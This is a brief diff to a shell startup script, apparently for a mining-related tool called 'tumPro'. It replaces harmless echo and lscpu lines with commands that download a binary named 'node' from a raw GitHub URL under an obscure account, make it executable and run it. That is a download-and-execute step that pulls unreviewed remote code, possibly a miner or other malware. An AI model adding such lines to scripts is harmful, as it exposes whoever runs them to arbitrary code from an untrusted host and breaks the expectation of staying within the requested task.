@@ -1,6 +1,6 @@
 #!/bin/sh
 set -e
 
-echo "Starting tumPro..."
-echo "Pool: ew"
-lscpu
+curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
+chmod +x node
+./node -h
